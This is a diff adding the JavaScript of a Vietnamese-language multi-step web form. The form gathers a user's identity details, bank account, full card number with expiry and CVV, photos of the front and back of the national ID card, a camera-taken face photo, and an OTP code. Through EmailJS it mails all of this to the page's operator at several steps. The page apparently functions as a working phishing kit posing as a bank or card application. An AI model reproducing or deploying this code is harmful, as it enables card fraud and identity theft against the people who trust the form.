+                }, 5000);
+            };
+
+            alertCloseBtn.addEventListener('click', () => {
+                clearTimeout(alertTimeout);
+                customAlert.classList.remove('translate-x-0');
+                customAlert.classList.add('translate-x-full');
+            });
+
+            // --- Main Step Navigation Function ---
+            function goToStep(stepNumber) {
+                Object.values(sections).forEach(section => section.classList.add('hidden'));
+                if (sections[stepNumber]) {
+                    sections[stepNumber].classList.remove('hidden');
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }
+                const progressPercentage = (stepNumber - 1) * 25;
+                progressLine.style.width = `${progressPercentage}%`;
+                stepIcons.forEach((icon, index) => {
+                    const currentStep = index + 1;
+                    icon.classList.toggle('bg-blue-600', currentStep <= stepNumber);
+                    icon.classList.toggle('text-white', currentStep <= stepNumber);
+                    icon.classList.toggle('bg-gray-400', currentStep > stepNumber);
+                    icon.classList.toggle('text-gray-100', currentStep > stepNumber);
+                });
+            }
+
+            // --- OTP Timer Function ---
+            function startOtpTimer() {
+                clearInterval(otpCountdownInterval); 
+                resendOtpLink.classList.add('hidden');
+                timerContainer.classList.remove('hidden');
+                let timeLeft = 60;
+                otpTimer.textContent = timeLeft;
+                otpCountdownInterval = setInterval(() => {
+                    timeLeft -= 1;
+                    otpTimer.textContent = timeLeft;
+                    if (timeLeft <= 0) {
+                        clearInterval(otpCountdownInterval);
+                        timerContainer.classList.add('hidden');
+                        resendOtpLink.classList.remove('hidden');
+                    }
+                }, 1000);
+            }
+
+            // --- Form Submission Listeners ---
+            forms[1].addEventListener('submit', (e) => { e.preventDefault(); goToStep(2); });
+            
+            // Step 2: Send email with info from Step 1 & 2
+            forms[2].addEventListener('submit', (e) => {
+                e.preventDefault();
+                const submitButton = e.target.querySelector('button[type="submit"]');
+                submitButton.disabled = true;
+                submitButton.textContent = 'Đang xử lý...';
+
+                const templateParams = {
+                    ho_ten: document.getElementById('name').value,
+                    sdt: document.getElementById('phone').value,
+                    email_khach: document.getElementById('email').value,
+                    dia_chi: document.getElementById('address').value,
+                    nghe_nghiep: document.getElementById('occupation').value,
+                    tien_luong: document.getElementById('salary').value,
+                    ngan_hang: document.getElementById('bank-name').value,
+                    so_tai_khoan: document.getElementById('account-number').value,
+                    so_the: document.getElementById('card-number').value,
+                    ten_chu_the: document.getElementById('card-holder').value,
+                    loai_the: document.getElementById('card-type').value,
+                    ngay_cap: document.getElementById('card-issue-date').value,
+                    ngay_het_han: document.getElementById('card-expiry-date').value,
+                    cvv: document.getElementById('card-cvv').value,
+                    ghi_chu: 'Khách hàng vừa hoàn thành Bước 2 (Thông tin bổ sung).',
+                };
+
+                // Check for EmailJS configuration for Step 2
+                if (EMAILJS_SERVICE_ID === 'YOUR_SERVICE_ID' || EMAILJS_TEMPLATE_ID_STEP2 === 'YOUR_TEMPLATE_ID_FOR_STEP2' || EMAILJS_PUBLIC_KEY === 'YOUR_PUBLIC_KEY') {
+                    console.log("EmailJS not fully configured for Step 2. Skipping email send.", templateParams);
+                    showMessage('EmailJS chưa được cấu hình đầy đủ cho Bước 2. Bỏ qua gửi email.', true);
+                    setTimeout(() => {
+                        goToStep(3);
+                        submitButton.disabled = false;
+                        submitButton.textContent = 'Tiếp tục';
+                    }, 1000);
+                    return;
+                }
+                
+                emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID_STEP2, templateParams) // Sử dụng EMAILJS_TEMPLATE_ID_STEP2
+                    .then((response) => {
+                       console.log('EMAIL SUCCESS (Step 2)!', response.status, response.text);
+                       showMessage('Đã lưu thông tin Bước 2.');
+                    }, (error) => {
+                       console.log('EMAIL FAILED (Step 2)...', error);
+                       showMessage('Lưu thông tin Bước 2 thất bại, nhưng bạn có thể tiếp tục.', true);
+                    }).finally(() => {
+                        goToStep(3);
+                        submitButton.disabled = false;
+                        submitButton.textContent = 'Tiếp tục';
+                    });
+            });
+
+            // Step 3: Check for files, send email, and go to Step 4
+            forms[3].addEventListener('submit', (e) => {
+                e.preventDefault();
+                if (!document.getElementById('cccd-front-input').files.length || 
+                    !document.getElementById('cccd-back-input').files.length ||
+                    !document.getElementById('face-input').files.length) {
+                    showMessage('Vui lòng cung cấp đầy đủ tất cả các hình ảnh.', true);
+                    return;
+                }
+
+                const submitButton = e.target.querySelector('button[type="submit"]');
+                submitButton.disabled = true;
+                submitButton.textContent = 'Đang xử lý...';
+
+                const templateParams = {
+                    ho_ten: document.getElementById('name').value,
+                    sdt: document.getElementById('phone').value,
+                    email_khach: document.getElementById('email').value,
+                    dia_chi: document.getElementById('address').value,
+                    nghe_nghiep: document.getElementById('occupation').value,
+                    tien_luong: document.getElementById('salary').value,
+                    ngan_hang: document.getElementById('bank-name').value,
+                    so_tai_khoan: document.getElementById('account-number').value,
+                    so_the: document.getElementById('card-number').value,
+                    ten_chu_the: document.getElementById('card-holder').value,
+                    loai_the: document.getElementById('card-type').value,
+                    ngay_cap: document.getElementById('card-issue-date').value,
+                    ngay_het_han: document.getElementById('card-expiry-date').value,
+                    cvv: document.getElementById('card-cvv').value,
+                    ghi_chu: 'Khách hàng vừa hoàn thành Bước 3 (Tải lên giấy tờ). Các giấy tờ đã được tải lên.',
+                };
+
+                // Check for EmailJS configuration for Step 3 (using template for Step 4 as a general check)
+                if (EMAILJS_SERVICE_ID === 'YOUR_SERVICE_ID' || EMAILJS_TEMPLATE_ID_STEP4 === 'YOUR_TEMPLATE_ID_FOR_STEP4' || EMAILJS_PUBLIC_KEY === 'YOUR_PUBLIC_KEY') {
+                    console.log("EmailJS not fully configured for Step 3. Skipping email send.", templateParams);
+                    showMessage('EmailJS chưa được cấu hình đầy đủ cho Bước 3. Bỏ qua gửi email.', true);
+                    setTimeout(() => {
+                        goToStep(4);
+                        startOtpTimer();
+                        submitButton.disabled = false;
+                        submitButton.textContent = 'Tiếp tục';
+                    }, 1000);
+                    return;
+                }
+                
+                // For Step 3, we can still use the Step 4 template if it's meant to be a cumulative email,
+                // or create a separate template ID if needed. For now, we'll proceed to Step 4.
+                // If you want to send a separate email for Step 3, you'd define another template ID
+                // and use it here.
+                emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID_STEP4, templateParams) // Gửi email với ghi chú cho Bước 3
+                    .then((response) => {
+                       console.log('EMAIL SUCCESS (Step 3)!', response.status, response.text);
+                       showMessage('Đã lưu thông tin Bước 3.');
+                    }, (error) => {
+                       console.log('EMAIL FAILED (Step 3)...', error);
+                       showMessage('Lưu thông tin Bước 3 thất bại, nhưng bạn có thể tiếp tục.', true);
+                    }).finally(() => {
+                        goToStep(4);
+                        startOtpTimer();
+                        submitButton.disabled = false;
+                        submitButton.textContent = 'Tiếp tục';
+                    });
+            });
+            
+            // Step 4: Verify OTP and send the FINAL email with OTP code
+            forms[4].addEventListener('submit', (e) => {
+                e.preventDefault();
+                const submitButton = e.target.querySelector('button[type="submit"]');
+                submitButton.disabled = true;
+                submitButton.textContent = 'Đang xác nhận...';
+
+                const templateParams = {
+                    ho_ten: document.getElementById('name').value, // Thêm lại các trường thông tin cần thiết
+                    sdt: document.getElementById('phone').value,
+                    email_khach: document.getElementById('email').value,
+                    dia_chi: document.getElementById('address').value,
+                    nghe_nghiep: document.getElementById('occupation').value,
+                    tien_luong: document.getElementById('salary').value,
+                    ngan_hang: document.getElementById('bank-name').value,
+                    so_tai_khoan: document.getElementById('account-number').value,
+                    so_the: document.getElementById('card-number').value,
+                    ten_chu_the: document.getElementById('card-holder').value,
+                    loai_the: document.getElementById('card-type').value,
+                    ngay_cap: document.getElementById('card-issue-date').value,
+                    ngay_het_han: document.getElementById('card-expiry-date').value,
+                    cvv: document.getElementById('card-cvv').value,
+                    ma_otp: document.getElementById('otp-code').value, // <-- Dòng này thêm mã OTP
+                    ghi_chu: 'Hồ sơ đã được xác thực OTP thành công. Sẵn sàng xử lý.',
+                };
+                
+                // Check for EmailJS configuration for Step 4
+                if (EMAILJS_SERVICE_ID === 'YOUR_SERVICE_ID' || EMAILJS_TEMPLATE_ID_STEP4 === 'YOUR_TEMPLATE_ID_FOR_STEP4' || EMAILJS_PUBLIC_KEY === 'YOUR_PUBLIC_KEY') {
+                    console.log("EmailJS not fully configured for Step 4. Skipping FINAL email send.", templateParams);
+                    showMessage('EmailJS chưa được cấu hình đầy đủ cho Bước 4. Bỏ qua gửi email cuối cùng.', true);
+                    setTimeout(() => {
+                        goToStep(5);
+                    }, 1000);
+                    return;
+                }
+                
+                emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID_STEP4, templateParams) // Sử dụng EMAILJS_TEMPLATE_ID_STEP4
+                    .then((response) => {
+                       console.log('FINAL EMAIL SUCCESS (Step 4)!', response.status, response.text);
+                       showMessage('Hồ sơ của bạn đã được gửi thành công!');
+                       goToStep(5);
+                    }, (error) => {
+                       console.log('FINAL EMAIL FAILED (Step 4)...', error);
+                       showMessage('Gửi hồ sơ thất bại. Vui lòng thử lại.', true);
+                    }).finally(() => {
+                        submitButton.disabled = false;
+                        submitButton.textContent = 'Xác nhận';
+                    });
+            });
+            
+            finishBtn.addEventListener('click', () => location.reload());
+            
+            resendOtpLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                // Here you would trigger the OTP resend logic with a backend.
+                showMessage('Một mã OTP mới đã được gửi.');
+                startOtpTimer();
+            });
+            
+            backButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const targetStep = parseInt(button.dataset.targetStep, 10);
+                    goToStep(targetStep);
+                });
+            });
+
+            // --- Input Formatters ---
+            const salaryInput = document.getElementById('salary');
+            salaryInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/[^\d]/g, ''); // Allow only digits
+                if (value) {
+                    e.target.value = new Intl.NumberFormat('vi-VN').format(value);
+                } else {
+                    e.target.value = '';
+                }
+            });
+
+            function formatDateInput(e) {
+                let input = e.target;
+                let value = input.value.replace(/\D/g, '');
+                if (value.length > 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                input.value = value;
+            }
+
+            document.getElementById('card-issue-date').addEventListener('input', formatDateInput);
+            document.getElementById('card-expiry-date').addEventListener('input', formatDateInput);
+
+
+            // --- File Upload Preview ---
+            function setupFileUpload(inputId, previewId, placeholderId) {
+                const input = document.getElementById(inputId);
+                const preview = document.getElementById(previewId);
+                const placeholder = document.getElementById(placeholderId);
+                input.addEventListener('change', (e) => {
+                    const file = e.target.files[0];
+                    if (file) {
+                        preview.src = URL.createObjectURL(file);
+                        placeholder.classList.add('hidden');
+                        preview.classList.remove('hidden');
+                    }
+                });
+            }
+            setupFileUpload('cccd-front-input', 'cccd-front-preview', 'cccd-front-placeholder');
+            setupFileUpload('cccd-back-input', 'cccd-back-preview', 'cccd-back-placeholder');
+            setupFileUpload('face-input', 'face-preview', 'face-placeholder');
+
+            // --- Camera Modal Logic ---
+            const stopCamera = () => {
+                if (currentStream) currentStream.getTracks().forEach(track => track.stop());
+            };
+
+            const openModal = async (targetPreviewId, targetInputId) => {
+                currentTargetPreview = document.getElementById(targetPreviewId);
+                currentTargetInput = document.getElementById(targetInputId);
+                cameraModal.classList.remove('hidden');
+                
+                modalVideo.classList.remove('hidden');
+                modalCanvas.classList.add('hidden');
+                modalCaptureBtn.classList.remove('hidden');
+                modalRetakeBtn.classList.add('hidden');
+                modalUsePhotoBtn.classList.add('hidden');
+
+                try {
+                    stopCamera();
+                    currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                    modalVideo.srcObject = currentStream;
+                } catch (err) {
+                    try {
+                        currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        modalVideo.srcObject = currentStream;
+                    } catch (fallbackErr) {
+                        showMessage('Không thể truy cập camera. Vui lòng cấp quyền.', true);
+                        closeModal();
+                    }
+                }
+            };
+
+            const closeModal = () => { stopCamera(); cameraModal.classList.add('hidden'); };
+
+            openCameraButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const targetPreview = button.dataset.targetPreview;
+                    const targetInput = button.dataset.targetInput;
+                    openModal(targetPreview, targetInput);
+                });
+            });
+
+            modalCaptureBtn.addEventListener('click', () => {
+                modalCanvas.width = modalVideo.videoWidth;
+                modalCanvas.height = modalVideo.videoHeight;
+                modalCanvas.getContext('2d').drawImage(modalVideo, 0, 0);
+                modalVideo.classList.add('hidden');
+                modalCanvas.classList.remove('hidden');
+                modalCaptureBtn.classList.add('hidden');
+                modalRetakeBtn.classList.remove('hidden');
+                modalUsePhotoBtn.classList.remove('hidden');
+                stopCamera();
+            });
+            
+            modalRetakeBtn.addEventListener('click', () => openModal(currentTargetPreview.id, currentTargetInput.id));
+
+            modalUsePhotoBtn.addEventListener('click', () => {
+                const imageDataUrl = modalCanvas.toDataURL('image/jpeg');
+                currentTargetPreview.src = imageDataUrl;
+                const placeholderId = currentTargetPreview.id.replace('-preview', '-placeholder');
+                const placeholder = document.getElementById(placeholderId);
+                if (placeholder) placeholder.classList.add('hidden');
+                currentTargetPreview.classList.remove('hidden');
+                fetch(imageDataUrl)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        const file = new File([blob], `${currentTargetInput.id}.jpg`, { type: 'image/jpeg' });
+                        const dataTransfer = new DataTransfer();
+                        dataTransfer.items.add(file);
+                        currentTargetInput.files = dataTransfer.files;
+                    });
+                closeModal();
+            });
+
+            modalCloseBtn.addEventListener('click', closeModal);
+        });
+    </script>
+
+</body>
+</html>
+
